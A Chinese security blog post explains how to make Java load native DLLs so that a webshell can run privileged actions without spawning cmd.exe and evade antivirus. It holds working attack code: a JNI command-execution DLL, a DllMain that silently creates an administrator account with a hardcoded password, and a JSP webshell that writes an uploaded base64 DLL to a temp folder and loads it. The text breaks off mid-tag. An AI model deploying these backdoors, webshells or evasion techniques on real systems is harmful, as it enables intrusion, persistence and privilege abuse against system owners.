title=\"java加载动态链接库\"></a>java加载动态链接库</h1><p>个人理解，java.exe加载动态链接库有什么用？</p>\n<blockquote>\n<p>感觉有点类似白加黑，直接在DLL里调用win-api去执行一些敏感操作，比如添加用户，shellcode执行，可以避免一些cmd的执行，因为现在webshell都是利用cmd.exe去执行。</p>\n</blockquote>\n<p>java加载动态链接库常见有三种方法</p>\n<ul>\n<li>System.load / System.loadLibrary</li>\n<li>Runtime.getRuntime().load / Runtime.getRuntime().loadLibrary</li>\n<li>com.sun.glass.utils.NativeLibLoader.loadLibrary</li>\n</ul>\n<p>前两个的load与loadLibrary有一些区别</p>\n<ul>\n<li>load接收的是绝对路径</li>\n<li>loadLibrary接收的是相对路径，不能含有 <code>\\</code>，可通过目录穿越到达 <strong>jdk安装所在盘或用户环境变量所在盘下的任意路径</strong>，进行加载动态库，调用时不需要动态库的后缀，会自动加上。linux系统应该可以达到任意目录，windows下应该就不行了</li>\n</ul>\n<p>loadDll.java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loadDll</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String path1 = <span class=\"string\">&quot;C:\\\\Users\\\\cys\\\\Desktop\\\\Dll3.dll&quot;</span>;</span><br><span class=\"line\">        String path2 = <span class=\"string\">&quot;../../../../../Dll3&quot;</span>;  <span class=\"comment\">// &quot;../../../../../users/admin/desktop/Dll3&quot;;</span></span><br><span class=\"line\">        RuntimeLoad(path);</span><br><span class=\"line\">        <span class=\"comment\">//NativeLoad(path2);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">RuntimeLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        Runtime.getRuntime().load(path);</span><br><span class=\"line\">        <span class=\"comment\">//Runtime.getRuntime().loadLibrary(path);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">SystemLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        System.load(path);</span><br><span class=\"line\">        <span class=\"comment\">//System.loadLibrary(path);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">NativeLoad</span><span class=\"params\">(String path)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Class Native = Class.forName(<span class=\"string\">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class=\"line\">        Object c = Native.newInstance();</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Native != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class=\"string\">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class=\"line\">            Load.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">            Load.invoke(c,path);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>计算器dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827192556937.png\" alt=\"image-20220827192556937\"></p>\n<h1 id=\"流程分析\"><a href=\"#流程分析\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h1><h2 id=\"Runtime-getRuntime-load\"><a href=\"#Runtime-getRuntime-load\" class=\"headerlink\" title=\"Runtime.getRuntime().load\"></a>Runtime.getRuntime().load</h2><p>调用了 <strong>Runtime.getRuntime().load0</strong> 方法，在这其中会判断路径是否为 <strong>绝对路径</strong> 然后调用 <strong>ClassLoader#loadLibrary</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827193435766.png\" alt=\"image-20220827193435766\"></p>\n<p>判断系统变量路径是否为空，为空就进行初始化。如果传入路径为 <strong>绝对路径</strong> 则调用 <strong>ClassLoader#loadLibrary0</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827194014259.png\" alt=\"image-20220827194014259\"></p>\n<p><strong>loadLibrary0</strong> 中判断ClassLoader是否加载过该链接库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212303815.png\" alt=\"image-20220827212303815\"></p>\n<p>然后实例化 <strong>NativeLibrary</strong> 对象，添加到 nativeLibraryContext 中，然后调用 <strong>load</strong> 方法去加载动态链接库</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827212859147.png\" alt=\"image-20220827212859147\"></p>\n<p>load为native方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213236449.png\" alt=\"image-20220827213236449\"></p>\n<h2 id=\"System-load\"><a href=\"#System-load\" class=\"headerlink\" title=\"System.load\"></a>System.load</h2><p>直接调用 Runtime.getRuntime().load0 流程同上</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827213836360.png\" alt=\"image-20220827213836360\"></p>\n<h2 id=\"Runtime-getRuntime-loadLibrary\"><a href=\"#Runtime-getRuntime-loadLibrary\" class=\"headerlink\" title=\"Runtime.getRuntime().loadLibrary\"></a>Runtime.getRuntime().loadLibrary</h2><p>调用 <strong>Runtime.getRuntime().loadLibrary0</strong> 判断 传入的path不能含有 <code>\\</code></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827223333156.png\" alt=\"image-20220827223333156\"></p>\n<p>直接 <strong>ClassLoader.loadLibrary</strong>，这里传入false，代表不是绝对路径， <strong>findLibrary</strong> 去寻找动态库的文件名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827225620127.png\" alt=\"image-20220827225620127\"></p>\n<p>如果没找到，从 <strong>jdk安装路径与用户环境变量路径下</strong>去寻找库， <strong>System.mapLibraryName</strong> 会根据平台自动加上后缀，windows自动在末尾添加 <strong>.dll</strong>，接着调用 <strong>ClassLoader#loadLibrary0</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827230322803.png\" alt=\"image-20220827230322803\"></p>\n<p><strong>findBuiltinLib</strong> 检查是否是内置的动态链接库，<a href=\"https://blog.csdn.net/qq_31865983/article/details/101856630\">Hotspot JNI库文件加载源码解析CSDN博客</a></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232241822.png\" alt=\"image-20220827232241822\"></p>\n<p>最后加载</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827231911788.png\" alt=\"image-20220827231911788\"></p>\n<h2 id=\"System-loadLibrary\"><a href=\"#System-loadLibrary\" class=\"headerlink\" title=\"System.loadLibrary\"></a>System.loadLibrary</h2><p>直接调用 Runtime.getRuntime().loadLibrary0 流程同上</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220827232454903.png\" alt=\"image-20220827232454903\"></p>\n<h2 id=\"NativeLibLoader-loadLibrary\"><a href=\"#NativeLibLoader-loadLibrary\" class=\"headerlink\" title=\"NativeLibLoader.loadLibrary\"></a>NativeLibLoader.loadLibrary</h2><p>提一嘴为什么反射调用</p>\n<blockquote>\n<p>com.sun.glass.utils.NativeLibLoader反射调用是因为在 jdk\\javafx-src.zip!\\com\\sun\\glass\\utils\\NativeLibLoader.java，在不同的版本的jdk中javafx并不是都存在的。</p>\n</blockquote>\n<p>loadLibraryInternal -&gt;loadLibraryFullPath</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828000908313.png\" alt=\"image-20220828000908313\"></p>\n<p>loadLibraryFullPath 绝对路径会加载成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001637907.png\" alt=\"image-20220828001637907\"></p>\n<p>loadLibraryFullPath 失败后，遍历环境变量去调用，这里用相对路径，总有一款适合你！</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220828001805150.png\" alt=\"image-20220828001805150\"></p>\n<h1 id=\"dll编写\"><a href=\"#dll编写\" class=\"headerlink\" title=\"dll编写\"></a>dll编写</h1><h2 id=\"vs编写\"><a href=\"#vs编写\" class=\"headerlink\" title=\"vs编写\"></a>vs编写</h2><p>直接vs进行编写，见 <a href=\"http://www.yongsheng.site/2022/08/24/DLL%E5%8A%AB%E6%8C%81/\">初探DLL劫持 | Y0ng的博客</a></p>\n<p>但是有一个意外情况，在新的win10虚拟机中，单单调用一个calc的dll竟然失败了，尝试了下发现是，我写的dll需要其他依赖库的支持，但是win10虚拟机中并没有这个库，导致无法加载恶意的dll。解决方法就是vs把其他库一起打包喽，运行库选择 <strong>/MT</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830172612983.png\" alt=\"image-20220830172612983\"></p>\n<p>虽然产生的dll很大，不过也算成功执行了。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830173055178.png\" alt=\"image-20220830173055178\"></p>\n<h2 id=\"JNI-技术\"><a href=\"#JNI-技术\" class=\"headerlink\" title=\"JNI 技术\"></a>JNI 技术</h2><p>慢慢了解到 JNI 技术，</p>\n<ul>\n<li><p>定义一个native修饰的方法</p>\n</li>\n<li><p>使用javah进行编译 </p>\n</li>\n<li><p>编写对应的c语言代码</p>\n</li>\n<li><p>使用gcc编译成dll文件</p>\n</li>\n<li><p>编写一个Java类使用System.loadLibrary方法，加载dll文件并且调用</p>\n</li>\n</ul>\n<p>loadDll.java，定义native方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">loadDll</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        String dllpath = <span class=\"string\">&quot;D:\\\\java-sec\\\\Dll\\\\src\\\\cmd.dll&quot;</span>;</span><br><span class=\"line\">        System.load(dllpath);</span><br><span class=\"line\"></span><br><span class=\"line\">        String cmd = exec(<span class=\"string\">&quot;calc&quot;</span>);</span><br><span class=\"line\">        System.out.println(cmd);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">native</span> String <span class=\"title\">exec</span><span class=\"params\">(String cmd)</span></span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>生成.h文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">javah -cp . loadDll</span><br></pre></td></tr></table></figure>\n\n<p>生成的头文件，loadDll.h</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;jni.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">#ifndef _Included_loadDll</span><br><span class=\"line\">#define _Included_loadDll</span><br><span class=\"line\">#ifdef __cplusplus</span><br><span class=\"line\">extern &quot;C&quot; &#123;</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br><span class=\"line\">JNIEXPORT jstring JNICALL Java_loadDll_exec</span><br><span class=\"line\">  (JNIEnv *, jclass, jstring);</span><br><span class=\"line\"></span><br><span class=\"line\">#ifdef __cplusplus</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#endif</span><br><span class=\"line\">#endif</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>编写命令执行的c文件，Command.c</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;loadDll.h&quot;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;stdio.h&gt;</span><br><span class=\"line\">#include &lt;sys&#x2F;types.h&gt;</span><br><span class=\"line\">#include &lt;unistd.h&gt;</span><br><span class=\"line\">#include &lt;stdlib.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">int execmd(const char *cmd, char *result)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    char buffer[1024*12];              &#x2F;&#x2F;定义缓冲区</span><br><span class=\"line\">    FILE *pipe &#x3D; _popen(cmd, &quot;r&quot;); &#x2F;&#x2F;打开管道，并执行命令</span><br><span class=\"line\">    if (!pipe)</span><br><span class=\"line\">        return 0; &#x2F;&#x2F;返回0表示运行失败</span><br><span class=\"line\"></span><br><span class=\"line\">    while (!feof(pipe))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        if (fgets(buffer, 128, pipe))</span><br><span class=\"line\">        &#123; &#x2F;&#x2F;将管道输出到result中</span><br><span class=\"line\">            strcat(result, buffer);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    _pclose(pipe); &#x2F;&#x2F;关闭管道</span><br><span class=\"line\">    return 1;      &#x2F;&#x2F;返回1表示运行成功</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">JNIEXPORT jstring JNICALL Java_loadDll_exec(JNIEnv *env, jobject class_object, jstring jstr)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    const char *cstr &#x3D; (*env)-&gt;GetStringUTFChars(env, jstr, NULL);</span><br><span class=\"line\">    char result[1024 * 12] &#x3D; &quot;&quot;; &#x2F;&#x2F;定义存放结果的字符串数组</span><br><span class=\"line\">    if (1 &#x3D;&#x3D; execmd(cstr, result))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">       &#x2F;&#x2F; printf(result);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    char return_messge[100] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    strcat(return_messge, result);</span><br><span class=\"line\">    jstring cmdresult &#x3D; (*env)-&gt;NewStringUTF(env, return_messge);</span><br><span class=\"line\">    &#x2F;&#x2F;system();</span><br><span class=\"line\"></span><br><span class=\"line\">    return cmdresult;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>编译为dll</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">gcc -I&quot;%JAVA_HOME%\\include&quot; -I&quot;%JAVA_HOME%\\include\\win32&quot; -shared -o cmd.dll Command.c</span><br></pre></td></tr></table></figure>\n\n<p>加载dll，成功。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830171029376.png\" alt=\"image-20220830171029376\"></p>\n<h1 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h1><p>这方面利用感觉比较多了，添加用户，命令执行，内网穿透，开启远程登录等等。</p>\n<p>在有360情况下添加用户</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220830204414971.png\" alt=\"image-20220830204414971\"></p>\n<p>dll中加上微软示例的添加用户代码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F; dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class=\"line\">#include &quot;pch.h&quot;</span><br><span class=\"line\">#include &lt;windows.h&gt;</span><br><span class=\"line\">#include &lt;string.h&gt;</span><br><span class=\"line\">#include &lt;lmaccess.h&gt;</span><br><span class=\"line\">#include &lt;lmerr.h&gt;</span><br><span class=\"line\">#include &lt;Tchar.h&gt;</span><br><span class=\"line\">#pragma comment(lib,&quot;netapi32.lib&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD CreateAdminUserInternal(void)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tNET_API_STATUS rc;</span><br><span class=\"line\">\tBOOL b;</span><br><span class=\"line\">\tDWORD dw;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUSER_INFO_1 ud;</span><br><span class=\"line\">\tLOCALGROUP_MEMBERS_INFO_0 gd;</span><br><span class=\"line\">\tSID_NAME_USE snu;</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD cbSid &#x3D; 256;\t&#x2F;&#x2F; 256 bytes should be enough for everybody :)</span><br><span class=\"line\">\tBYTE Sid[256];</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD cbDomain &#x3D; 256 &#x2F; sizeof(TCHAR);</span><br><span class=\"line\">\tTCHAR Domain[256];</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Create user</span><br><span class=\"line\">\t&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370649%28v&#x3D;VS.85%29.aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmemset(&amp;ud, 0, sizeof(ud));</span><br><span class=\"line\"></span><br><span class=\"line\">\tud.usri1_name &#x3D; (LPWSTR)TEXT(&quot;audit&quot;);\t\t\t\t\t\t&#x2F;&#x2F; username</span><br><span class=\"line\">\tud.usri1_password &#x3D; (LPWSTR)TEXT(&quot;Test123456789!&quot;);\t\t\t\t&#x2F;&#x2F; password</span><br><span class=\"line\">\tud.usri1_priv &#x3D; USER_PRIV_USER;\t\t\t\t\t&#x2F;&#x2F; cannot set USER_PRIV_ADMIN on creation</span><br><span class=\"line\">\tud.usri1_flags &#x3D; UF_SCRIPT | UF_NORMAL_ACCOUNT;\t&#x2F;&#x2F; must be set</span><br><span class=\"line\">\tud.usri1_script_path &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">\trc &#x3D; NetUserAdd(</span><br><span class=\"line\">\t\tNULL,\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t1,\t\t\t\t&#x2F;&#x2F; information level</span><br><span class=\"line\">\t\t(LPBYTE)&amp;ud,</span><br><span class=\"line\">\t\tNULL\t\t\t&#x2F;&#x2F; error value</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (rc !&#x3D; NERR_Success) &#123;</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;NetUserAdd FAIL %d 0x%08x\\r\\n&quot;), rc, rc);</span><br><span class=\"line\">\t\treturn rc;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Get user SID</span><br><span class=\"line\">\t&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa379159(v&#x3D;vs.85).aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tb &#x3D; LookupAccountName(</span><br><span class=\"line\">\t\tNULL,\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t_T(&quot;audit&quot;),\t&#x2F;&#x2F; account name</span><br><span class=\"line\">\t\tSid,\t\t\t&#x2F;&#x2F; SID</span><br><span class=\"line\">\t\t&amp;cbSid,\t\t\t&#x2F;&#x2F; SID size</span><br><span class=\"line\">\t\tDomain,\t\t\t&#x2F;&#x2F; Domain</span><br><span class=\"line\">\t\t&amp;cbDomain,\t\t&#x2F;&#x2F; Domain size</span><br><span class=\"line\">\t\t&amp;snu\t\t\t&#x2F;&#x2F; SID_NAME_USE (enum)</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (!b) &#123;</span><br><span class=\"line\">\t\tdw &#x3D; GetLastError();</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;LookupAccountName FAIL %d 0x%08x\\r\\n&quot;), dw, dw);</span><br><span class=\"line\">\t\treturn dw;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\">\t&#x2F;&#x2F; Add user to &quot;Administrators&quot; local group</span><br><span class=\"line\">\t&#x2F;&#x2F; http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;aa370436%28v&#x3D;VS.85%29.aspx</span><br><span class=\"line\">\t&#x2F;&#x2F;</span><br><span class=\"line\"></span><br><span class=\"line\">\tmemset(&amp;gd, 0, sizeof(gd));</span><br><span class=\"line\"></span><br><span class=\"line\">\tgd.lgrmi0_sid &#x3D; (PSID)Sid;</span><br><span class=\"line\"></span><br><span class=\"line\">\trc &#x3D; NetLocalGroupAddMembers(</span><br><span class=\"line\">\t\tNULL,\t\t\t\t\t&#x2F;&#x2F; local server</span><br><span class=\"line\">\t\t_T(&quot;Administrators&quot;),</span><br><span class=\"line\">\t\t0,\t\t\t\t\t\t&#x2F;&#x2F; information level</span><br><span class=\"line\">\t\t(LPBYTE)&amp;gd,</span><br><span class=\"line\">\t\t1\t\t\t\t\t\t&#x2F;&#x2F; only one entry</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tif (rc !&#x3D; NERR_Success) &#123;</span><br><span class=\"line\">\t\t_tprintf(_T(&quot;NetLocalGroupAddMembers FAIL %d 0x%08x\\r\\n&quot;), rc, rc);</span><br><span class=\"line\">\t\treturn rc;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class=\"line\">                       DWORD  ul_reason_for_call,</span><br><span class=\"line\">                       LPVOID lpReserved</span><br><span class=\"line\">                     )</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    switch (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    case DLL_PROCESS_ATTACH:</span><br><span class=\"line\">\t\tCreateAdminUserInternal();</span><br><span class=\"line\">    case DLL_THREAD_ATTACH:</span><br><span class=\"line\">    case DLL_THREAD_DETACH:</span><br><span class=\"line\">    case DLL_PROCESS_DETACH:</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>需要一个管理员身份才有权限添加用户。成功绕过杀软添加用户。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220831152710826.png\" alt=\"image-20220831152710826\"></p>\n<p>师傅的项目里还有RDP以及dump内存等代码</p>\n<h1 id=\"jsp\"><a href=\"#jsp\" class=\"headerlink\" title=\"jsp\"></a>jsp</h1><p>直接搬来大佬的jsp，通过base64解密后写入随机命名的dll，然后进行load。可拓展为反序列化，JNDI注入等等。</p>\n<figure class=\"highlight jsp\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;%@ page <span class=\"keyword\">import</span>=<span class=\"string\">&quot;java.io.RandomAccessFile&quot;</span> %&gt;</span><br><span class=\"line\">&lt;%!</span><br><span class=\"line\">    <span class=\"comment\">// 获取随机的动态链接库文件名称</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> String <span class=\"title\">getFileName</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        String fileName = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        java.util.Random random = <span class=\"keyword\">new</span> java.util.Random(System.currentTimeMillis());</span><br><span class=\"line\">        String os = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (os.contains(<span class=\"string\">&quot;windows&quot;</span>))&#123;</span><br><span class=\"line\">            fileName = <span class=\"string\">&quot;C:\\\\Windows\\\\Temp\\\\&quot;</span> + random.nextInt(<span class=\"number\">10000000</span>) + <span class=\"string\">&quot;.dll&quot;</span>;</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            fileName = <span class=\"string\">&quot;/tmp/&quot;</span>+ random.nextInt(<span class=\"number\">10000000</span>) + <span class=\"string\">&quot;.so&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fileName;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// JSP 声明函数中无法获取全局默认的ServletRequest对象，但ServletRequest继承java.io.InputStream，可以替代</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">UploadBase64DLL</span><span class=\"params\">(java.io.InputStream stream)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        sun.misc.BASE64Decoder b = <span class=\"keyword\">new</span> sun.misc.BASE64Decoder();</span><br><span class=\"line\">        java.io.File file = <span class=\"keyword\">new</span> java.io.File(getFileName());</span><br><span class=\"line\">        java.io.FileOutputStream fos = <span class=\"keyword\">new</span> java.io.FileOutputStream(file);</span><br><span class=\"line\">        fos.write(b.decodeBuffer(stream));</span><br><span class=\"line\">        fos.close();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> file.getAbsolutePath();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">RuntimeLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        Runtime.getRuntime().load(path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">SystemLoad</span><span class=\"params\">(String path)</span></span>&#123;</span><br><span class=\"line\">        System.load(path);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"comment\">// 有些JDK版本没有这个对象，因此采用反射加载进行运行</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title\">NativeLoad</span><span class=\"params\">(String path)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Class Native = Class.forName(<span class=\"string\">&quot;com.sun.glass.utils.NativeLibLoader&quot;</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(Native != <span class=\"keyword\">null</span>)&#123;</span><br><span class=\"line\">            java.lang.reflect.Method Load = Native.getDeclaredMethod(<span class=\"string\">&quot;loadLibrary&quot;</span>,String.class);</span><br><span class=\"line\">            Load.invoke(path);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"comment\">//&lt;/jsp:declaration&gt;</span></span><br><span class=\"line\">%&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;%</span><br><span class=\"line\">    out.print(<span class=\"string\">&quot;OK&quot;</span>);</span><br><span class=\"line\">    <span class=\"comment\">//加载方式</span></span><br><span class=\"line\">    String method = request.getHeader(<span class=\"string\">&quot;WWW-Authenticate&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>&#123;</span><br><span class=\"line\">        ServletInputStream stream = request.getInputStream();</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (stream.available() == <span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">            out.println(System.getProperty(<span class=\"string\">&quot;os.arch&quot;</span>));</span><br><span class=\"line\">            <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        String file =  UploadBase64DLL(stream);</span><br><span class=\"line\">        <span class=\"comment\">// 按照Header头选择加载方式</span></span><br><span class=\"line\">        <span class=\"keyword\">switch</span> (method)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;1&quot;</span>:</span><br><span class=\"line\">                RuntimeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;2&quot;</span>:</span><br><span class=\"line\">                SystemLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">case</span> <span class=\"string\">&quot;3&quot;</span>:</span><br><span class=\"line\">                NativeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                RuntimeLoad(file);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">catch</span> (Exception e)&#123;</span><br><span class=\"line\">        System.out.println(e.toString());</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">%&gt;</span><br></pre></td></tr></table></figure>\n\n<p>成功写入</p>\n<p><img 